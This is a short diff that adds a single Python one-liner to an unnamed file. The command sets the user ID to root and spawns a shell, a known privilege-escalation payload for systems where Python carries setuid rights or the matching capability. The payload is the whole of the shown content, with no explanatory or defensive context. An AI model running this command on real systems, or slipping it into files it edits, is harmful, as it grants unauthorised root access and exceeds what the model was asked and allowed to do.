@@ -1,0 +1,3 @@
+
+
+python -c "import os; os.setuid(0); os.execl('/bin/sh', 'sh', '-c', 'reset; exec sh')"
